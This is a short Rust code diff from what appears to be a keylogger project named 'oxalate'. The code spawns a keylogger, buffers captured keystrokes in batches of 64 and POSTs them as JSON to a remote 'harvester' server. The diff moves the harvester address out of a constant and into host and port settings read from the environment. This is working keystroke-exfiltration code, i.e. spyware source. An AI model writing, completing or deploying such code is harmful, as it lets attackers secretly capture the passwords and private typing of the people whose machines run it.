@@ -3,20 +3,24 @@ use log::{error, info};
 use oxalate_keylogger::spawn_keylogger;
 use reqwest::Client;
 
-use crate::HARVESTER_URL;
-
 use oxalate_schemas::harvester::public::keylogger::post_keylogger::{Key, Req};
+
+use crate::AppState;
 
 const KEY_BUFFERING: usize = 64;
 
-pub fn keylogger(reqwest_client: Client) {
+pub fn keylogger(reqwest_client: Client, global_state: AppState) {
     let mut rx = spawn_keylogger();
     tokio::spawn(async move {
         let mut req = Req(Vec::with_capacity(KEY_BUFFERING));
         loop {
             if req.0.len() >= KEY_BUFFERING {
                 let res = reqwest_client
-                    .post(format!("http://{}/keylogger", *HARVESTER_URL))
+                    .post(format!(
+                        "http://{}:{}/keylogger",
+                        global_state.env_vars.harvester_dns,
+                        global_state.env_vars.public_harvester_port
+                    ))
                     .json::<Req>(&req)
                     .send()
                     .await;
